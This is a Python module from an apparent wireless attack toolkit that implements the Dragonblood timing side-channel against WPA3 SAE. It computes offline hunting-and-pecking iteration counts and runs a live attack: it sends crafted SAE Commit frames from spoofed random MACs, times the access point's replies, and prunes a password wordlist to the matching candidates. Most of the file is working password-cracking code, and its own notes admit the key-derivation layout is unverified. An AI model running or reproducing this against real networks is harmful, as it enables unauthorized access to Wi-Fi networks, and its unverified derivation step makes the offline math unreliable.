"""Dragonblood: SAE (WPA3) hunting-and-pecking timing side-channel
(CVE-2019-9494, Vanhoef & Ronen 2019, "Dragonblood: Analyzing the
Dragonfly Handshake of WPA3 and EAP-pwd").

SAE derives a per-session "password element" (PE) via a loop
(hunting-and-pecking, RFC 7664 sec 3.2.1 / IEEE 802.11 sec 12.4.4.3.2):
try candidate x-coordinates derived from {password, MAC_A, MAC_B,
counter} until one lands on a valid point on the negotiated curve
(checked via a quadratic-residue test). The loop length depends on the
password and both MAC addresses. Unpatched implementations (hostapd
< 2.10, mid-2019) run exactly that many iterations before stopping --
variable time. An attacker who measures how long a peer takes to reply
to an SAE Commit (varying their OWN MAC to get many independent timing
samples against the SAME real password) can infer the iteration count
and use it to prune an offline password dictionary down to only the
candidates whose OWN iteration count (computed here, offline, for the
same MAC pair) matches what was observed. Patched implementations
always run a fixed 40 iterations regardless of when the real point is
found, eliminating the timing signal entirely.

This module is stage 1 of 3 (2026-09-04 roadmap item): the pure-math
offline half. Stage 2 (SAE Commit frame crafting) and stage 3 (the live
timing-measurement/pruning attack) build on top of this.

⚠️ CONFIDENCE NOTE -- read before trusting this against a real target:
the P-256 curve constants and Legendre/QR-test logic below are HIGH
confidence (standard, published in FIPS 186-4, used everywhere). The
KDF-Hash-Length stretching step is reconstructed from memory of the
802.11 spec's own KDF definition (12.7.1.6.2) and the NIST SP 800-108
counter-mode KDF it closely resembles -- this exact byte layout has
NOT been independently verified against the spec text (no network
access to fetch it) or a real hostapd capture (no vulnerable AP
available -- this vulnerability class was patched in hostapd 2.10,
mid-2019). If a live test of this ever becomes possible, verify THIS
function first: a subtly wrong byte layout would still produce a
self-consistent, deterministic, plausible-looking iteration count that
simply doesn't match what any real AP actually computes. Everything
below is unit-tested for internal self-consistency (determinism,
MAC-order symmetry, expected distribution shape) -- that is the most
that can be verified without a reference implementation or real
capture to check against.
"""

from __future__ import annotations

import hashlib
import hmac
import statistics
import time
from dataclasses import dataclass, field

from scapy.layers.dot11 import Dot11, Dot11Auth
from scapy.sendrecv import AsyncSniffer, sendp

from ..frames import SAE_AUTH_ALGO, craft_sae_commit
from ..radio import ensure_channel, random_locally_administered_mac

# NIST P-256 (secp256r1) -- SAE's mandatory "group 19". FIPS 186-4
# Appendix D.1.2.3. y^2 = x^3 + a*x + b mod p.
P256_P = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
P256_A = P256_P - 3  # NIST curves use a = -3 mod p
P256_B = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B

MAX_ITERATIONS = 40  # k -- the fixed loop count patched implementations always run


def _is_quadratic_residue(value: int, p: int) -> bool:
    """Euler's criterion: value is a QR mod prime p iff
    value^((p-1)/2) mod p == 1. Zero counts as a residue here (matching
    the real hunting-and-pecking loop: a zero right-hand side still
    yields a valid point, (x, 0))."""
    value %= p
    if value == 0:
        return True
    return pow(value, (p - 1) // 2, p) == 1


def _kdf_hash_length(key: bytes, label: bytes, length_bits: int) -> bytes:
    """NIST SP 800-108 counter-mode KDF using HMAC-SHA256 -- the
    stretching function IEEE 802.11 calls KDF-Hash-Length, used
    throughout SAE/dragonfly to expand a fixed-size seed to an
    arbitrary bit length. See the module docstring's confidence note."""
    n = (length_bits + 255) // 256  # 256 = SHA-256 output size in bits
    result = b""
    for i in range(1, n + 1):
        result += hmac.new(
            key,
            i.to_bytes(4, "big") + label + b"\x00" + length_bits.to_bytes(4, "big"),
            hashlib.sha256,
        ).digest()
    return result[: (length_bits + 7) // 8]


def _mac_bytes(mac: str) -> bytes:
    return bytes(int(b, 16) for b in mac.split(":"))


def hunting_and_pecking_iterations(
    password: str, mac_a: str, mac_b: str, max_iterations: int = MAX_ITERATIONS,
) -> int:
    """How many hunting-and-pecking loop iterations {password, mac_a,
    mac_b} takes to find a valid password element on P-256 -- the
    offline half of the Dragonblood timing side-channel: compute this
    for every candidate password in a dictionary, then compare against
    the iteration count inferred from a real AP's measured response
    timing to prune candidates that don't match.

    Symmetric in (mac_a, mac_b) -- both orderings give the same result,
    matching the real spec's max(MAC)||min(MAC) construction (both
    sides of a real handshake must derive the identical password
    element regardless of who's "A" and who's "B").

    Capped at max_iterations (default 40, matching the fixed loop count
    patched implementations always run) -- returns max_iterations if no
    valid point is found within that many tries (astronomically
    unlikely for a real password, but the real spec caps it too)."""
    a_bytes = _mac_bytes(mac_a)
    b_bytes = _mac_bytes(mac_b)
    key = max(a_bytes, b_bytes) + min(a_bytes, b_bytes)
    pw_bytes = password.encode("utf-8")

    for counter in range(1, max_iterations + 1):
        pwd_seed = hmac.new(key, pw_bytes + bytes([counter]), hashlib.sha256).digest()
        pwd_value = int.from_bytes(
            _kdf_hash_length(pwd_seed, b"SAE Hunting and Pecking", 256), "big",
        )
        if pwd_value >= P256_P:
            continue
        rhs = (pow(pwd_value, 3, P256_P) + P256_A * pwd_value + P256_B) % P256_P
        if _is_quadratic_residue(rhs, P256_P):
            return counter
    return max_iterations


# ── stage 3: live timing measurement + dictionary pruning ─────────────────────

@dataclass
class DragonbloodResult:
    """Outcome of a timing_prune_wordlist() call."""
    pruned_wordlist: list[str] = field(default_factory=list)
    mac_timings: dict[str, float] = field(default_factory=dict)  # median RTT (seconds) per responsive source MAC
    detail: str = ""


def _measure_sae_commit_rtt(iface: str, bssid: str, client_mac: str, timeout: float = 2.0) -> float | None:
    """Send one SAE Commit from client_mac to bssid and measure wall-clock
    time until the AP genuinely engages with it (any Dot11Auth frame from
    bssid using the SAE algorithm with status=0) -- None if nothing
    arrives within timeout, OR if the only reply is a rejection.

    status MUST be checked, not just algo -- confirmed live (2026-09-04)
    against a real WPA2 (non-SAE) AP: it replied within ~30ms to every
    single Commit with algo=3 (echoing back the algorithm we asked for,
    standard 802.11 behavior for a rejection) but status=13
    (AUTH_ALGO_UNSUPPORTED) -- a fast, constant-time "algorithm not
    supported" bounce from the AP's ordinary auth-algorithm check,
    returned before it would ever touch the timing-vulnerable
    hunting-and-pecking derivation at all. Treating that as a real timing
    sample would poison every measurement with meaningless, uniform
    rejection latency instead of the actual signal -- worse, it would
    look like clean, consistent data instead of an obvious failure,
    exactly the kind of wrong-but-plausible result that's hard to catch
    without testing against real hardware.

    A single measurement is noisy (network jitter, retries, general RF
    conditions) -- timing_prune_wordlist() averages several per MAC,
    never trusts one sample alone. Same AsyncSniffer send-then-poll
    pattern as attacks/pmkid.py's capture_pmkid(), timed instead of
    content-matched."""
    found: list[float] = []
    sent_at = [0.0]

    def handler(pkt) -> None:
        dot11 = pkt.getlayer(Dot11)
        auth = pkt.getlayer(Dot11Auth)
        if dot11 is None or auth is None:
            return
        if dot11.addr2 != bssid or auth.algo != SAE_AUTH_ALGO or auth.status != 0:
            return
        found.append(time.perf_counter() - sent_at[0])

    sniffer = AsyncSniffer(iface=iface, prn=handler, stop_filter=lambda p: bool(found), store=False)
    sniffer.start()
    time.sleep(0.05)  # let the capture socket actually come up before sending
    sent_at[0] = time.perf_counter()
    sendp(craft_sae_commit(bssid, client_mac), iface=iface, verbose=False)
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline and not found:
        if not sniffer.thread or not sniffer.thread.is_alive():
            break
        time.sleep(0.01)
    try:
        sniffer.stop()
    except Exception:  # noqa: BLE001, S110 - stop can race with thread teardown
        pass
    return found[0] if found else None


def timing_prune_wordlist(
    iface: str,
    bssid: str,
    wordlist: list[str],
    channel: int | None = None,
    num_macs: int = 4,
    samples_per_mac: int = 5,
    timeout: float = 2.0,
    stop_event=None,
    progress_fn=None,
) -> DragonbloodResult:
    """The live half of the Dragonblood timing attack: measure real SAE
    Commit response timing from several source MACs against bssid,
    then keep only the wordlist candidates whose OWN offline
    hunting_and_pecking_iterations() count (computed per MAC pair) is
    consistent with the observed timing order.

    Pruning rule (a deliberate simplification of the academic paper's
    full statistical hypothesis testing, not a re-implementation of it):
    rank the responsive MACs by median observed RTT, ascending (fewer
    iterations should mean less time), then for each candidate password
    rank the same MACs by that password's predicted iteration count.
    A candidate survives only if the two rankings match exactly. This
    is a real, structurally sound consistency check, but a coarser one
    than the paper's -- it can both under- and over-prune when timing
    noise or predicted-count ties land two MACs close together.

    Only meaningful against a genuinely UNPATCHED SAE implementation
    (hostapd < 2.10, mid-2019) -- see the module docstring. Against a
    patched AP (fixed 40-iteration loop, no timing signal), this will
    correctly find no usable correlation and should return the
    wordlist essentially unpruned or empty depending on noise, neither
    of which means anything about the real password.

    stop_event: checked between MACs (not between individual samples
    within a MAC) -- an in-progress MAC's sample batch always finishes
    before stopping."""
    log = progress_fn or (lambda msg: None)
    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")

    macs = [random_locally_administered_mac() for _ in range(num_macs)]
    mac_timings: dict[str, float] = {}

    for mac in macs:
        if stop_event is not None and stop_event.is_set():
            log("stopped before finishing timing measurements")
            return DragonbloodResult(
                pruned_wordlist=list(wordlist), mac_timings=mac_timings,
                detail="stopped early -- no pruning applied",
            )
        samples: list[float] = []
        for i in range(samples_per_mac):
            rtt = _measure_sae_commit_rtt(iface, bssid, mac, timeout=timeout)
            if rtt is not None:
                samples.append(rtt)
            log(f"MAC {mac} sample {i + 1}/{samples_per_mac}: {'no reply' if rtt is None else f'{rtt * 1000:.1f}ms'}")
        if not samples:
            log(f"MAC {mac}: no replies at all -- AP may not support SAE or isn't responding to this MAC, skipping it")
            continue
        mac_timings[mac] = statistics.median(samples)
        log(f"MAC {mac}: median RTT {mac_timings[mac] * 1000:.1f}ms over {len(samples)} sample(s)")

    if len(mac_timings) < 2:
        log("fewer than 2 responsive MACs -- not enough data to correlate timing against, returning wordlist unpruned")
        return DragonbloodResult(
            pruned_wordlist=list(wordlist), mac_timings=mac_timings,
            detail="insufficient live responses to prune (need >=2 responsive MACs)",
        )

    observed_rank = sorted(mac_timings, key=lambda m: mac_timings[m])

    pruned = []
    for pw in wordlist:
        predicted = {mac: hunting_and_pecking_iterations(pw, mac, bssid) for mac in mac_timings}
        predicted_rank = sorted(predicted, key=lambda m: predicted[m])
        if predicted_rank == observed_rank:
            pruned.append(pw)

    log(f"pruned {len(wordlist)} -> {len(pruned)} candidate(s) consistent with observed timing order")
    return DragonbloodResult(
        pruned_wordlist=pruned, mac_timings=mac_timings,
        detail=f"{len(pruned)}/{len(wordlist)} candidates consistent with observed timing "
               "(only meaningful against an unpatched/pre-hostapd-2.10 AP)",
    )
